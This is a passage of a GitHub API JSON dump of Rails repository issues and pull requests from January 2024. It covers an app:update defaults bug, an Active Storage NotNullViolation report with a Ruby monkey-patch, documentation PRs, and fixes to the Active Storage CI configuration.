        "body": "### Steps to reproduce\r\nI made an update from Rails 7.1.2 to 7.1.3 by changing the rails version number to 7.1.3 in the gemfile and running `bundle update`. After that i ran `rails app:update` which produced the file `config/initializers/new_framework_defaults_7_1.rb`. I already have `config.load_defaults 7.1` in my `config/application.rb`, so I think, this file shouldn't be generated?\r\n\r\n### Expected behavior\r\nThe file `config/initializers/new_framework_defaults_7_1.rb` should not be created, if `config.load_defaults 7.1` is already present in `config/application.rb`.\r\n\r\n### Actual behavior\r\nThe file `config/initializers/new_framework_defaults_7_1.rb` is created after  `rails app:update`, despite `config.load_defaults 7.1` is already present in `config/application.rb`.\r\n\r\n### System configuration\r\n**Rails version**: 7.1.3\r\n\r\n**Ruby version**: ruby 3.2.2 (2023-03-30 revision e51014f9c0) [x64-mingw-ucrt]\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50792/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50792/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50791",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50791/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50791/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50791/events",
        "html_url": "https://github.com/rails/rails/pull/50791",
        "id": 2088474444,
        "node_id": "PR_kwDNIULOZG9VpQ",
        "number": 50791,
        "title": "Add Solid Queue reference to Rails Guides docs [ci skip]",
        "user": {
            "login": "dvinciguerra",
            "id": 114177,
            "node_id": "MDQ6VXNlcjExNDE3Nw==",
            "avatar_url": "https://avatars.githubusercontent.com/u/114177?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dvinciguerra",
            "html_url": "https://github.com/dvinciguerra",
            "followers_url": "https://api.github.com/users/dvinciguerra/followers",
            "following_url": "https://api.github.com/users/dvinciguerra/following{/other_user}",
            "gists_url": "https://api.github.com/users/dvinciguerra/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dvinciguerra/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dvinciguerra/subscriptions",
            "organizations_url": "https://api.github.com/users/dvinciguerra/orgs",
            "repos_url": "https://api.github.com/users/dvinciguerra/repos",
            "events_url": "https://api.github.com/users/dvinciguerra/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dvinciguerra/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-18T15:00:54Z",
        "updated_at": "2024-01-18T16:59:43Z",
        "closed_at": "2024-01-18T16:59:43Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50791",
            "html_url": "https://github.com/rails/rails/pull/50791",
            "diff_url": "https://github.com/rails/rails/pull/50791.diff",
            "patch_url": "https://github.com/rails/rails/pull/50791.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nIncluding a reference to the Solid Queue project in the Rails Guides documentation can be useful, especially but not exclusively for new developers, as it allows them to become familiar with the project and its functionalities, and decide whether they want to use it in their projects, just like the other suggested adapters.\r\n\r\n### Detail\r\n\r\nThis pull request simply adds the reference (link to the project's README) in the Rails Guides documentation in the section dedicated to configuring adapters.\r\n\r\n<!--\r\n### Additional information\r\n\r\n Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50791/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50791/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50790",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50790/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50790/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50790/events",
        "html_url": "https://github.com/rails/rails/issues/50790",
        "id": 2088260078,
        "node_id": "I_kwDNIULOfHhR7g",
        "number": 50790,
        "title": "ActiveRecord::NotNullViolation (PG::NotNullViolation: ERROR:  null value in column \"record_id\" of relation \"active_storage_attachments\" violates not-null constraint",
        "user": {
            "login": "raoehtesham03",
            "id": 152256436,
            "node_id": "U_kgDOCRM_tA",
            "avatar_url": "https://avatars.githubusercontent.com/u/152256436?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/raoehtesham03",
            "html_url": "https://github.com/raoehtesham03",
            "followers_url": "https://api.github.com/users/raoehtesham03/followers",
            "following_url": "https://api.github.com/users/raoehtesham03/following{/other_user}",
            "gists_url": "https://api.github.com/users/raoehtesham03/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/raoehtesham03/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/raoehtesham03/subscriptions",
            "organizations_url": "https://api.github.com/users/raoehtesham03/orgs",
            "repos_url": "https://api.github.com/users/raoehtesham03/repos",
            "events_url": "https://api.github.com/users/raoehtesham03/events{/privacy}",
            "received_events_url": "https://api.github.com/users/raoehtesham03/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            },
            {
                "id": 1071962662,
                "node_id": "MDU6TGFiZWwxMDcxOTYyNjYy",
                "url": "https://api.github.com/repos/rails/rails/labels/more-information-needed",
                "name": "more-information-needed",
                "color": "bfdadc",
                "default": false,
                "description": "When reporter needs to provide more information"
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-18T13:11:04Z",
        "updated_at": "2024-01-22T09:41:20Z",
        "closed_at": "2024-01-22T09:41:20Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\nI have upgraded my Rails application from 6.1 to 7.0.8 . After that I am getting this error.\r\nBelow is my activestorage.rb file\r\n\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\n```ruby\r\nActiveStorage::Attached::Model.module_eval do\r\n    class_methods do\r\n      def has_one_attached(name, dependent: :purge_later, acl: :private, service: :service)\r\n        generated_association_methods.class_eval <<-CODE, __FILE__, __LINE__ + 1\r\n          def #{name}\r\n            @active_storage_attached ||= {}\r\n            @active_storage_attached[:#{name}] ||= ActiveStorage::Attached::One.new(\"#{name}\", self, dependent: #{dependent == :purge_later ? \":purge_later\" : \"false\"}, acl: \"#{acl}\")\r\n          end\r\n\r\n          def #{name}=(attachable)\r\n            attachment_changes[\"#{name}\"] =\r\n              if attachable.nil?\r\n                ActiveStorage::Attached::Changes::DeleteOne.new(\"#{name}\", self, dependent: #{dependent == :purge_later ? \":purge_later\" : \"false\"}, acl: \"#{acl}\")\r\n              else\r\n                ActiveStorage::Attached::Changes::CreateOne.new(\"#{name}\", self, attachable, dependent: #{dependent == :purge_later ? \":purge_later\" : \"false\"}, acl: \"#{acl}\")\r\n              end\r\n          end\r\n        CODE\r\n        has_one :\"#{name}_attachment\", -> { where(name: name) }, class_name: \"ActiveStorage::Attachment\", as: :record, inverse_of: :record, dependent: false\r\n        has_one :\"#{name}_blob\", through: :\"#{name}_attachment\", class_name: \"ActiveStorage::Blob\", source: :blob\r\n\r\n        scope :\"with_attached_#{name}\", -> { includes(\"#{name}_attachment\": :blob) }\r\n\r\n        after_save { attachment_changes[name.to_s]&.save }\r\n\r\n        after_commit(on: %i[ create update ]) { attachment_changes.delete(name.to_s).try(:upload) }\r\n        ActiveRecord::Reflection.add_attachment_reflection(\r\n          self,\r\n          name,\r\n          ActiveRecord::Reflection.create(:has_one_attached, name, nil, { dependent: dependent, acl: \"#{acl}\" }, self)\r\n        )\r\n      end\r\n\r\n      def has_many_attached(name, dependent: :purge_later, acl: :private, service: :service)\r\n        generated_association_methods.class_eval <<-CODE, __FILE__, __LINE__ + 1\r\n          def #{name}\r\n            @active_storage_attached ||= {}\r\n            @active_storage_attached[:#{name}] ||= ActiveStorage::Attached::Many.new(\"#{name}\", self, dependent: #{dependent == :purge_later ? \":purge_later\" : \"false\"}, acl: \"#{acl}\")\r\n          end\r\n\r\n          def #{name}=(attachables)\r\n            if ActiveStorage.replace_on_assign_to_many\r\n              attachment_changes[\"#{name}\"] =\r\n                if Array(attachables).none?\r\n                  ActiveStorage::Attached::Changes::DeleteMany.new(\"#{name}\", self)\r\n                else\r\n                  ActiveStorage::Attached::Changes::CreateMany.new(\"#{name}\", self, attachables, dependent: #{dependent == :purge_later ? \":purge_later\" : \"false\"}, acl: \"#{acl}\")\r\n                end\r\n            else\r\n              if Array(attachables).any?\r\n                attachment_changes[\"#{name}\"] =\r\n                  ActiveStorage::Attached::Changes::CreateMany.new(\"#{name}\", self, #{name}.blobs + attachables, dependent: #{dependent == :purge_later ? \":purge_later\" : \"false\"}, acl: \"#{acl}\")\r\n              end\r\n            end\r\n          end\r\n        CODE\r\n\r\n        has_many :\"#{name}_attachments\", -> { where(name: name) }, as: :record, class_name: \"ActiveStorage::Attachment\", inverse_of: :record, dependent: :destroy do\r\n          def purge\r\n            each(&:purge)\r\n            reset\r\n          end\r\n\r\n          def purge_later\r\n            each(&:purge_later)\r\n            reset\r\n          end\r\n        end\r\n        has_many :\"#{name}_blobs\", through: :\"#{name}_attachments\", class_name: \"ActiveStorage::Blob\", source: :blob\r\n\r\n        scope :\"with_attached_#{name}\", -> { includes(\"#{name}_attachments\": :blob) }\r\n\r\n        after_save { attachment_changes[name.to_s]&.save }\r\n\r\n        after_commit(on: %i[ create update ]) { attachment_changes.delete(name.to_s).try(:upload) }\r\n\r\n        ActiveRecord::Reflection.add_attachment_reflection(\r\n          self,\r\n          name,\r\n          ActiveRecord::Reflection.create(:has_many_attached, name, nil, { dependent: dependent, acl: \"#{acl}\" }, self)\r\n        )\r\n      end\r\n    end\r\n  end\r\n```\r\n\r\n### Expected behavior\r\nIt should be able to create the record.\r\n\r\n### Actual behavior\r\nI am facing this error .\r\n\r\nActiveRecord::NotNullViolation (PG::NotNullViolation: ERROR:  null value in column \"record_id\" of relation \"active_storage_attachments\" violates not-null constraint\r\n\r\n### System configuration\r\n**Rails version**: 7.0.8\r\n\r\n**Ruby version**: 3.0.6\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50790/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 1
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50790/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50789",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50789/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50789/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50789/events",
        "html_url": "https://github.com/rails/rails/pull/50789",
        "id": 2087883925,
        "node_id": "PR_kwDNIULOZGc96Q",
        "number": 50789,
        "title": "Use relative includes of README's in documentation [ci-skip]",
        "user": {
            "login": "p8",
            "id": 28561,
            "node_id": "MDQ6VXNlcjI4NTYx",
            "avatar_url": "https://avatars.githubusercontent.com/u/28561?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/p8",
            "html_url": "https://github.com/p8",
            "followers_url": "https://api.github.com/users/p8/followers",
            "following_url": "https://api.github.com/users/p8/following{/other_user}",
            "gists_url": "https://api.github.com/users/p8/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/p8/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/p8/subscriptions",
            "organizations_url": "https://api.github.com/users/p8/orgs",
            "repos_url": "https://api.github.com/users/p8/repos",
            "events_url": "https://api.github.com/users/p8/events{/privacy}",
            "received_events_url": "https://api.github.com/users/p8/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107188,
                "node_id": "MDU6TGFiZWwxMDcxODg=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionmailer",
                "name": "actionmailer",
                "color": "8B00FC",
                "default": false,
                "description": null
            },
            {
                "id": 107190,
                "node_id": "MDU6TGFiZWwxMDcxOTA=",
                "url": "https://api.github.com/repos/rails/rails/labels/activemodel",
                "name": "activemodel",
                "color": "00E5FF",
                "default": false,
                "description": null
            },
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            },
            {
                "id": 123812746,
                "node_id": "MDU6TGFiZWwxMjM4MTI3NDY=",
                "url": "https://api.github.com/repos/rails/rails/labels/activejob",
                "name": "activejob",
                "color": "5319e7",
                "default": false,
                "description": null
            },
            {
                "id": 300028327,
                "node_id": "MDU6TGFiZWwzMDAwMjgzMjc=",
                "url": "https://api.github.com/repos/rails/rails/labels/actioncable",
                "name": "actioncable",
                "color": "bfdadc",
                "default": false,
                "description": null
            },
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            },
            {
                "id": 1174770998,
                "node_id": "MDU6TGFiZWwxMTc0NzcwOTk4",
                "url": "https://api.github.com/repos/rails/rails/labels/actionmailbox",
                "name": "actionmailbox",
                "color": "f4a6cb",
                "default": false,
                "description": ""
            },
            {
                "id": 1180817762,
                "node_id": "MDU6TGFiZWwxMTgwODE3NzYy",
                "url": "https://api.github.com/repos/rails/rails/labels/actiontext",
                "name": "actiontext",
                "color": "3bc667",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-18T09:34:54Z",
        "updated_at": "2024-01-21T17:30:11Z",
        "closed_at": "2024-01-21T17:30:07Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50789",
            "html_url": "https://github.com/rails/rails/pull/50789",
            "diff_url": "https://github.com/rails/rails/pull/50789.diff",
            "patch_url": "https://github.com/rails/rails/pull/50789.patch",
            "merged_at": "2024-01-21T17:30:07Z"
        },
        "body": "The Rails documentation uses the `:include:` directive to inline the README of the framework into the main documentation page. As the README's aren't in the root directory from where SDoc is run we need to add the framework path to the include:\r\n\r\n    # :include: activesupport/README.md\r\n\r\nThis results in a warning when installing the gems as generating the rdoc for the gem is run from the gem/framework root:\r\n\r\n    Couldn't find file to include 'activesupport/README.rdoc' from lib/active_support.rb\r\n\r\nThe `:include:` RDoc directive supports includes relative to the current file as well:\r\n\r\n    # :include: ../README.md\r\n\r\nThis makes sure it works for the Rails API docs and the separate gems.\r\n\r\n### Additional information\r\n\r\nFixes: https://github.com/rails/rails/issues/49524\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50789/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 1,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50789/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50788",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50788/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50788/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50788/events",
        "html_url": "https://github.com/rails/rails/pull/50788",
        "id": 2087842242,
        "node_id": "PR_kwDNIULOZGarYQ",
        "number": 50788,
        "title": "`RateLimiting` Cleanups",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-18T09:12:50Z",
        "updated_at": "2024-01-18T16:54:45Z",
        "closed_at": "2024-01-18T16:54:44Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50788",
            "html_url": "https://github.com/rails/rails/pull/50788",
            "diff_url": "https://github.com/rails/rails/pull/50788.diff",
            "patch_url": "https://github.com/rails/rails/pull/50788.patch",
            "merged_at": "2024-01-18T16:54:44Z"
        },
        "body": "Followup: https://github.com/rails/rails/pull/50781\r\n\r\nSome small issues I failed to address in the original PR.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50788/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50788/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50787",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50787/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50787/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50787/events",
        "html_url": "https://github.com/rails/rails/pull/50787",
        "id": 2087434730,
        "node_id": "PR_kwDNIULOZGEZ0Q",
        "number": 50787,
        "title": "[7-1-stable] Fix Active Storage test configurations for CI",
        "user": {
            "login": "zzak",
            "id": 277819,
            "node_id": "MDQ6VXNlcjI3NzgxOQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/277819?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/zzak",
            "html_url": "https://github.com/zzak",
            "followers_url": "https://api.github.com/users/zzak/followers",
            "following_url": "https://api.github.com/users/zzak/following{/other_user}",
            "gists_url": "https://api.github.com/users/zzak/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/zzak/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/zzak/subscriptions",
            "organizations_url": "https://api.github.com/users/zzak/orgs",
            "repos_url": "https://api.github.com/users/zzak/repos",
            "events_url": "https://api.github.com/users/zzak/events{/privacy}",
            "received_events_url": "https://api.github.com/users/zzak/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-18T03:54:05Z",
        "updated_at": "2024-01-18T17:03:29Z",
        "closed_at": "2024-01-18T17:03:28Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50787",
            "html_url": "https://github.com/rails/rails/pull/50787",
            "diff_url": "https://github.com/rails/rails/pull/50787.diff",
            "patch_url": "https://github.com/rails/rails/pull/50787.patch",
            "merged_at": "2024-01-18T17:03:28Z"
        },
        "body": "This is a resubmission of #50786 on an upstream branch to test the integration (secrets are not available in forks).\r\n\r\n---\r\n\r\nWhile investigating #50427, I found that the service configurations were missing, I think due to #47259.\r\n\r\nWe should expect the S3 and GCS tests to run here, like in 7-0-stable:\r\nhttps://buildkite.com/rails/rails/builds/104036#018d1779-6305-41bb-82d1-b262123dcab4\r\n\r\n```\r\nSkipping Azure Storage Direct Upload tests because no Azure Storage configuration was supplied\r\nSkipping Azure Storage Public Service tests because no Azure configuration was supplied\r\nSkipping Azure Storage Service tests because no Azure configuration was supplied\r\nSkipping GCS Public Service tests because no GCS configuration was supplied\r\n/usr/local/bundle/gems/googleauth-1.9.1/lib/googleauth/helpers/connection.rb:27: warning: attribute accessor as module_function\r\n/usr/local/bundle/gems/google-apis-core-0.11.3/lib/google/apis/core/base_service.rb:228: warning: method redefined; discarding old client\r\nSkipping S3 Public Service tests because no S3 configuration was supplied\r\n/usr/local/bundle/gems/aws-sdk-s3-1.142.0/lib/aws-sdk-s3/endpoint_provider.rb:22: warning: assigned but unused variable - key\r\n/usr/local/bundle/gems/aws-sdk-s3-1.142.0/lib/aws-sdk-s3/endpoint_provider.rb:23: warning: assigned but unused variable - prefix\r\n```\r\n\r\nHowever, you can see in the build from that PR that all services are skipped:\r\nhttps://buildkite.com/rails/rails/builds/93948#018666ba-a8de-47d3-877d-26788ab11fcd/1010-1083\r\n\r\n```\r\nSkipping S3 Direct Upload tests because no S3 configuration was supplied\r\nSkipping GCS Direct Upload tests because no GCS configuration was supplied\r\nSkipping Azure Storage Direct Upload tests because no Azure Storage configuration was supplied\r\nSkipping Azure Storage Public Service tests because no Azure configuration was supplied\r\nSkipping Azure Storage Service tests because no Azure configuration was supplied\r\nSkipping GCS Public Service tests because no GCS configuration was supplied\r\nSkipping GCS Service tests because no GCS configuration was supplied\r\nSkipping S3 Public Service tests because no S3 configuration was supplied\r\nSkipping S3 Service tests because no S3 configuration was supplied\r\n```\r\n\r\nI wasn't able to find a previous build (on 7-1-stable branch) older than that, so going on a hunch here.\r\n\r\nGoing to see if this at least gets the tests running in CI for this branch first, since the work to remove the dummy application is probably not going to be backported.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50787/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50787/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50786",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50786/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50786/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50786/events",
        "html_url": "https://github.com/rails/rails/pull/50786",
        "id": 2087353727,
        "node_id": "PR_kwDNIULOZF_-Tg",
        "number": 50786,
        "title": "[7-1-stable] Try to fix Active Storage test configurations for CI",
        "user": {
            "login": "zzak",
            "id": 277819,
            "node_id": "MDQ6VXNlcjI3NzgxOQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/277819?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/zzak",
            "html_url": "https://github.com/zzak",
            "followers_url": "https://api.github.com/users/zzak/followers",
            "following_url": "https://api.github.com/users/zzak/following{/other_user}",
            "gists_url": "https://api.github.com/users/zzak/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/zzak/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/zzak/subscriptions",
            "organizations_url": "https://api.github.com/users/zzak/orgs",
            "repos_url": "https://api.github.com/users/zzak/repos",
            "events_url": "https://api.github.com/users/zzak/events{/privacy}",
            "received_events_url": "https://api.github.com/users/zzak/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-18T02:27:18Z",
        "updated_at": "2024-01-18T03:52:46Z",
        "closed_at": "2024-01-18T03:52:40Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50786",
            "html_url": "https://github.com/rails/rails/pull/50786",
            "diff_url": "https://github.com/rails/rails/pull/50786.diff",
            "patch_url": "https://github.com/rails/rails/pull/50786.patch",
            "merged_at": null
        },
